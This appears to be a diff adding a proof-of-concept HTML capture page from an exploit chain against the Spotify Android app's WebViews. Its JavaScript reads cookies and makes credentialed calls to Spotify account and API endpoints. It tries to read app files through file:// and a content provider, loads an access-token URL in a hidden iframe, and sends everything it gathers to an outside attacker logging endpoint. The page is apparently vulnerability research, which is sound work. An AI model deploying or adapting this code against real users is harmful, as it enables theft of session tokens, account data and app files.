@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Spotify</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background: #121212;
+            color: #fff;
+        }
+        .header { color: #1DB954; font-size: 18px; margin-bottom: 16px; }
+        .info { background: #282828; padding: 12px; border-radius: 8px; margin: 8px 0; font-size: 13px; word-break: break-all; }
+        .label { color: #1DB954; font-weight: bold; }
+        .success { color: #1DB954; }
+        .warning { color: #ff6b6b; }
+        #log { margin-top: 16px; }
+    </style>
+</head>
+<body>
+    <div class="header">PoC - Data Capture Page</div>
+    <div id="context"></div>
+    <div id="log"></div>
+
+    <script>
+    // =============================================================
+    // STAGE 3: Capture Page
+    //
+    // This page runs inside one of two contexts:
+    //
+    // A) ReportWebViewActivity's y111 WebView:
+    //    - Triggered via double intent redirection
+    //    - getSessionTransferToken() was called with this URL
+    //    - WebView has: JS enabled, DOM storage, NO file access restrictions (API < 30)
+    //
+    // B) InAppBrowserActivity's WebView:
+    //    - Direct redirect from AgeAssuranceWebViewActivity
+    //    - WebView has: JS enabled, but file access is disabled
+    //    - Shares Spotify's CookieManager (cookies for .spotify.com)
+    //
+    // This page demonstrates:
+    // 1. That attacker code executes inside a Spotify WebView
+    // 2. The WebView context and capabilities
+    // 3. Cookie/storage access attempts
+    // 4. Attempts to access Spotify API endpoints (CSRF)
+    // =============================================================
+
+    var ATTACKER_LOG_ENDPOINT = "https://evilios.free.beeceptor.com/log";
+
+    function log(msg, cls) {
+        var div = document.createElement('div');
+        div.className = 'info ' + (cls || '');
+        div.innerHTML = msg;
+        document.getElementById('log').appendChild(div);
+    }
+
+    function sendToAttacker(data) {
+        // Exfiltrate collected data to attacker's server
+        var img = new Image();
+        img.src = ATTACKER_LOG_ENDPOINT + "?data=" + encodeURIComponent(JSON.stringify(data));
+
+        // Also try fetch for reliability
+        try {
+            fetch(ATTACKER_LOG_ENDPOINT, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data),
+                mode: 'no-cors'
+            });
+        } catch(e) {}
+    }
+
+    // Collect environment info
+    var info = {
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        url: window.location.href,
+        referrer: document.referrer,
+        cookies: document.cookie,
+        origin: window.location.origin,
+        protocol: window.location.protocol
+    };
+
+    document.getElementById('context').innerHTML =
+        '<div class="info"><span class="label">Context:</span> Running inside Spotify WebView</div>' +
+        '<div class="info"><span class="label">URL:</span> ' + info.url + '</div>' +
+        '<div class="info"><span class="label">Protocol:</span> ' + info.protocol + '</div>' +
+        '<div class="info"><span class="label">User-Agent:</span> ' + info.userAgent + '</div>';
+
+    log('<span class="label">1. Basic Environment</span>');
+    log('Cookies visible: ' + (info.cookies || '(none - HttpOnly or different origin)'));
+    log('localStorage available: ' + (typeof localStorage !== 'undefined'));
+    log('DOM storage: ' + (typeof sessionStorage !== 'undefined'));
+
+    // -------------------------------------------------------
+    // Test 1: Check if we can read cookies for spotify.com
+    // (Only works if page origin matches spotify.com)
+    // -------------------------------------------------------
+    log('<span class="label">2. Cookie Access Test</span>');
+    if (document.cookie) {
+        log('<span class="success">Cookies found: ' + document.cookie + '</span>');
+        info.cookiesFound = true;
+    } else {
+        log('No cookies readable from current origin (expected for cross-origin)');
+    }
+
+    // -------------------------------------------------------
+    // Test 2: CSRF - Make authenticated requests to Spotify APIs
+    // The WebView's CookieManager attaches cookies automatically
+    // -------------------------------------------------------
+    log('<span class="label">3. Authenticated Request Tests (CSRF)</span>');
+
+    // Test: Get user profile via Web API
+    // Cookies from .spotify.com are sent with this request
+    fetch('https://api.spotify.com/v1/me', {
+        credentials: 'include'
+    }).then(function(r) {
+        log('api.spotify.com/v1/me - Status: ' + r.status);
+        if (r.ok) {
+            return r.json().then(function(data) {
+                log('<span class="success">USER DATA STOLEN: ' + JSON.stringify(data) + '</span>');
+                info.userData = data;
+                sendToAttacker(info);
+            });
+        } else {
+            log('API returned ' + r.status + ' (may need Bearer token, not cookies)');
+        }
+    }).catch(function(e) {
+        log('CORS blocked (expected): ' + e.message);
+    });
+
+    // Test: Access account page (web session cookies)
+    fetch('https://accounts.spotify.com/api/account-settings', {
+        credentials: 'include'
+    }).then(function(r) {
+        log('accounts.spotify.com/api/account-settings - Status: ' + r.status);
+        if (r.ok) {
+            return r.text().then(function(data) {
+                log('<span class="success">ACCOUNT DATA: ' + data.substring(0, 200) + '...</span>');
+                info.accountData = data;
+                sendToAttacker(info);
+            });
+        }
+    }).catch(function(e) {
+        log('CORS blocked: ' + e.message);
+    });
+
+    // -------------------------------------------------------
+    // Test 3: File access (only works on y111 WebView, API < 30)
+    // -------------------------------------------------------
+    log('<span class="label">4. File Access Test (y111 WebView, API &lt; 30)</span>');
+
+    // Try to access shared_prefs
+    var xhr = new XMLHttpRequest();
+    try {
+        xhr.open('GET', 'file:///data/data/com.spotify.music/shared_prefs/', false);
+        xhr.send();
+        if (xhr.responseText) {
+            log('<span class="success">FILE ACCESS: ' + xhr.responseText.substring(0, 200) + '</span>');
+            info.fileAccess = xhr.responseText;
+        }
+    } catch(e) {
+        log('File access blocked: ' + e.message + ' (expected on API >= 30 or InAppBrowser)');
+    }
+
+    // -------------------------------------------------------
+    // Test 4: Content provider access
+    // -------------------------------------------------------
+    log('<span class="label">5. Content Provider Access Test</span>');
+
+    try {
+        var xhr2 = new XMLHttpRequest();
+        xhr2.open('GET', 'content://com.spotify.music.share/', false);
+        xhr2.send();
+        if (xhr2.responseText) {
+            log('<span class="success">CONTENT ACCESS: ' + xhr2.responseText.substring(0, 200) + '</span>');
+            info.contentAccess = xhr2.responseText;
+        }
+    } catch(e) {
+        log('Content access blocked: ' + e.message);
+    }
+
+    // -------------------------------------------------------
+    // Test 5: Internal URL access
+    // Navigate to Spotify internal pages
+    // -------------------------------------------------------
+    log('<span class="label">6. Internal Navigation Test</span>');
+
+    // Try to load an internal Spotify web page
+    var testFrame = document.createElement('iframe');
+    testFrame.style.display = 'none';
+    testFrame.src = 'https://open.spotify.com/get_access_token?reason=transport&productType=web_player';
+    testFrame.onload = function() {
+        try {
+            var content = testFrame.contentDocument.body.innerText;
+            if (content) {
+                log('<span class="success">ACCESS TOKEN: ' + content.substring(0, 200) + '</span>');
+                info.accessToken = content;
+                sendToAttacker(info);
+            }
+        } catch(e) {
+            log('Cross-origin iframe blocked: ' + e.message);
+        }
+    };
+    document.body.appendChild(testFrame);
+
+    // Send initial data
+    sendToAttacker(info);
+
+    log('<br><span class="label">Summary:</span> Attacker code is executing inside a Spotify-owned WebView. '
+        + 'Even if CORS blocks direct API access, this demonstrates that the intent redirection '
+        + 'allows arbitrary code execution in Spotify\'s WebView context, triggers authenticated '
+        + 'API calls (getSessionTransferToken), and on API &lt; 30 may allow file system access.');
+    </script>
+</body>
+</html>
